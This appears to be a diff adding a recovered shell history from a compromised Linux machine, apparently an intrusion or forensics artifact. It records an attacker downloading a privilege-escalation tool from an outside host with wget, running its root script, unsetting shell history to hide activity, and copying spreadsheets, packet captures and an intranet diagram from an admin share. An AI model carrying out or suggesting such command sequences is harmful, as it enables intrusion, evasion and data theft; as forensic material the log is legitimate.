@@ -1,0 +1,26 @@
+ a13000 uname -a
+ a1300d ll -h
+ a13013 mkdir temp
+ a1301e ll -h
+ a13024 chmod o-xrw temp/
+ a13036 ll -h
+ a1303c cd temp/
+ a13045 cp /mnt/hgfs/Admin_share/*.xls .
+ a13066 cp /mnt/hgfs/Admin_share/*.pcap .
+ a13088 exit
+ a1308d uname -a
+ a13099 exit
+ a1309e X -v
+ a130a3 X -V
+ a130a8 X -version
+ a130b3 cd temp
+ a130bb wget http://metasploit.com/users/hdm/tools/xmodulepath.tgz
+ a130f6 tar -zpxvf xmodulepath.tgz
+ a13111 cd xmodulepath
+ a13123 unset HISTORY
+ a13131 ./root.sh
+ a1313b exit
+ a13144 cd ..
+ a1314a cp /mnt/hgfs/Admin_share/intranet.vsd .
+ a13175 ls -lh
+ a1317c exit
